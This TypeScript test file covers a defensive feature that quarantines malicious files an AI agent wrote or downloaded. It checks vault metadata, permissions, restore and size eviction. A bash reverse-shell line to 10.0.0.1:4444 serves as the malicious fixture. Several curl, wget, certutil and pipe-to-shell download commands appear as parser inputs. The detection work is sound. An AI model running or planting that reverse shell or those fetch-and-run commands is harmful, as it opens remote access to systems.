/**
 * Item 69 (quarantine half): a file an agent tool call wrote or downloaded that
 * the content scan classifies as malicious is moved into the per-user vault —
 * owner-only, never executable, with hash, original path, reason and time — and
 * the agent is told it is gone. Off by default; benign files are never touched.
 */

import { createHash } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { join, resolve } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
	classifyFileContent,
	downloadTargetsFromCommand,
	maliciousFindings,
	quarantineAgentWrittenFiles,
	writtenFilePaths,
} from "../file-quarantine.js";
import { AutoQuarantine, QUARANTINE_PAYLOAD_SUFFIX } from "../quarantine.js";
import { loadThreatsFromDirs } from "../threat-loader.js";
import { type Config, ConfigSchema } from "../types.js";
import { makeTmpDir, removeTmpDir } from "./test-utils.js";

const THREATS_DIR = resolve(__dirname, "..", "..", "..", "..", "threats");
const REVERSE_SHELL = "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";
const BENIGN = "#!/bin/bash\necho building\nnpm run build\n";

let work: string;
let vaultDir: string;

function config(overrides: Record<string, unknown> = {}): Config {
	return ConfigSchema.parse({
		logging: { enabled: true, log_clean: true, path: join(work, "audit.jsonl") },
		response: {
			quarantine: { enabled: true, dir: vaultDir, ...overrides },
		},
	});
}

function sha256(path: string): string {
	return createHash("sha256").update(readFileSync(path)).digest("hex");
}

async function run(toolName: string, toolInput: Record<string, unknown>, cfg = config()) {
	return quarantineAgentWrittenFiles({
		sessionId: "s1",
		toolName,
		toolInput,
		workingDirectory: work,
		agentRuntime: "claude-code",
		threatsDir: THREATS_DIR,
		config: cfg,
	});
}

beforeEach(async () => {
	work = await makeTmpDir();
	vaultDir = join(work, "vault");
});

afterEach(async () => {
	await removeTmpDir(work);
});

describe("which files a call wrote", () => {
	it("recognises download commands and their output names", () => {
		expect(
			downloadTargetsFromCommand(
				"curl -sSL https://x.test/a.sh -o /tmp/a.sh && wget -O b.bin https://x.test/b && curl -O https://x.test/dir/c.tar.gz; wget https://x.test/d.zip -P dl; iwr https://x.test/e.ps1 -OutFile e.ps1; curl https://x.test/f > f.sh",
			),
		).toEqual(["/tmp/a.sh", "b.bin", "c.tar.gz", "dl/d.zip", "e.ps1", "f.sh"]);
		expect(downloadTargetsFromCommand("curl https://x.test/a | sh")).toEqual([]);
		expect(downloadTargetsFromCommand("wget -qO- https://x.test/a")).toEqual([]);
		expect(downloadTargetsFromCommand("ls -la > listing.txt")).toEqual([]);
		expect(downloadTargetsFromCommand("certutil -urlcache -f https://x.test/p.exe p.exe")).toEqual([
			"p.exe",
		]);
	});

	it("resolves write targets against the host working directory", () => {
		expect(writtenFilePaths("Write", { file_path: "src/run.sh", content: "x" }, work)).toEqual([
			resolve(work, "src/run.sh"),
		]);
		expect(writtenFilePaths("Bash", { command: "curl -o tool.sh https://x.test/t" }, work)).toEqual(
			[resolve(work, "tool.sh")],
		);
		expect(writtenFilePaths("Read", { file_path: "src/run.sh" }, work)).toEqual([]);
		expect(writtenFilePaths("Bash", { command: "rm -rf build" }, work)).toEqual([]);
	});
});

describe("content classification", () => {
	it("flags block rules at or above the severity floor only", async () => {
		const threats = await loadThreatsFromDirs([THREATS_DIR]);
		const shell = maliciousFindings(classifyFileContent("x.sh", REVERSE_SHELL, threats), "high");
		expect(shell.map((f) => f.threatId)).toContain("CLT-CMD-003");
		expect(maliciousFindings(classifyFileContent("b.sh", BENIGN, threats), "medium")).toEqual([]);
		expect(classifyFileContent("notes.md", "# Notes\nhello\n", threats)).toEqual([]);
	});
});

describe("quarantineAgentWrittenFiles", () => {
	it("does nothing while the feature is off (the default)", async () => {
		const path = join(work, "evil.sh");
		writeFileSync(path, REVERSE_SHELL);
		const result = await quarantineAgentWrittenFiles({
			sessionId: "s1",
			toolName: "Write",
			toolInput: { file_path: path },
			agentRuntime: "claude-code",
			threatsDir: THREATS_DIR,
			config: ConfigSchema.parse({}),
		});
		expect(result.enabled).toBe(false);
		expect(result.agentNotice).toBeNull();
		expect(readFileSync(path, "utf8")).toBe(REVERSE_SHELL);
	});

	it("moves a malicious written file into the vault with its metadata", async () => {
		const path = join(work, "evil.sh");
		writeFileSync(path, REVERSE_SHELL, { mode: 0o755 });
		const hash = sha256(path);

		const result = await run("Write", { file_path: "evil.sh", content: REVERSE_SHELL });

		expect(existsSync(path)).toBe(false);
		expect(result.quarantined).toHaveLength(1);
		expect(result.agentNotice).toContain(path);
		expect(result.agentNotice).toContain("quarantine");

		const store = new AutoQuarantine({
			quarantineDir: vaultDir,
			retentionDays: 30,
			notifyChannels: [],
		});
		const [item] = store.list();
		expect(item?.originalPath).toBe(path);
		expect(item?.fileHash).toBe(hash);
		expect(item?.metadata.reason).toBe("agent_written_file_classified_malicious");
		expect(item?.metadata.rule_ids).toContain("CLT-CMD-003");
		expect(item?.quarantinePath.endsWith(QUARANTINE_PAYLOAD_SUFFIX)).toBe(true);
		expect(sha256(item?.quarantinePath as string)).toBe(hash);
		if (process.platform !== "win32") {
			// Owner read-only, never executable.
			expect(statSync(item?.quarantinePath as string).mode & 0o777).toBe(0o400);
		}

		const audit = readFileSync(join(work, "audit.jsonl"), "utf8");
		expect(audit).toContain('"type":"quarantine"');
	});

	it("quarantines a file a shell download created", async () => {
		const path = join(work, "tool.sh");
		writeFileSync(path, REVERSE_SHELL);
		const result = await run("Bash", { command: "curl -sSL https://x.test/t -o tool.sh" });
		expect(result.quarantined.map((q) => q.originalPath)).toEqual([path]);
		expect(existsSync(path)).toBe(false);
	});

	it("leaves benign files alone", async () => {
		const path = join(work, "build.sh");
		writeFileSync(path, BENIGN);
		const result = await run("Write", { file_path: path });
		expect(result.scanned).toEqual([path]);
		expect(result.quarantined).toEqual([]);
		expect(result.agentNotice).toBeNull();
		expect(readFileSync(path, "utf8")).toBe(BENIGN);
	});

	it("reports a file too large to scan instead of calling it clean", async () => {
		const path = join(work, "big.sh");
		writeFileSync(path, REVERSE_SHELL + "#".repeat(4096));
		const result = await run("Write", { file_path: path }, config({ max_scan_bytes: 1024 }));
		expect(result.skipped[0]?.reason).toMatch(/too_large_to_scan/);
		expect(result.scanned).toEqual([]);
		expect(existsSync(path)).toBe(true);
	});

	it("never touches AIDR's own state directory", async () => {
		const stateDir = join(homedir(), ".singularity-aidr");
		mkdirSync(stateDir, { recursive: true });
		const path = join(stateDir, "planted.sh");
		writeFileSync(path, REVERSE_SHELL);
		const result = await run("Write", { file_path: path });
		expect(result.quarantined).toEqual([]);
		expect(existsSync(path)).toBe(true);
	});

	it("releases a quarantined file back with its bytes and permission bits", async () => {
		const path = join(work, "evil.sh");
		writeFileSync(path, REVERSE_SHELL, { mode: 0o750 });
		const [quarantined] = (await run("Write", { file_path: path })).quarantined;
		const store = new AutoQuarantine({
			quarantineDir: vaultDir,
			retentionDays: 30,
			notifyChannels: [],
		});
		await store.restore(quarantined?.id as string);
		expect(readFileSync(path, "utf8")).toBe(REVERSE_SHELL);
		if (process.platform !== "win32") expect(statSync(path).mode & 0o777).toBe(0o750);
		expect(store.list()).toEqual([]);
	});

	it("keeps the vault within its size bound, evicting the oldest first", async () => {
		const store = new AutoQuarantine({
			quarantineDir: vaultDir,
			retentionDays: 30,
			notifyChannels: [],
		});
		const ids: string[] = [];
		for (const name of ["a", "b", "c"]) {
			const path = join(work, `${name}.bin`);
			writeFileSync(path, Buffer.alloc(1000, name));
			ids.push((await store.quarantine(path, "TEST")).id);
			await new Promise((r) => setTimeout(r, 5));
		}
		expect(store.totalBytes()).toBe(3000);
		const evicted = await store.enforceSizeLimit(2000);
		expect(evicted).toEqual([ids[0]]);
		expect(
			store
				.list()
				.map((item) => item.id)
				.sort(),
		).toEqual([ids[1], ids[2]].sort());
		expect(await store.enforceSizeLimit(0)).toEqual([]);
	});

	it("treats retention_days 0 as keep-forever", async () => {
		const store = new AutoQuarantine({
			quarantineDir: vaultDir,
			retentionDays: 0,
			notifyChannels: [],
		});
		const path = join(work, "x.bin");
		writeFileSync(path, "x");
		await store.quarantine(path, "TEST");
		expect(await store.cleanupExpired()).toEqual([]);
		expect(store.list()).toHaveLength(1);
	});
});
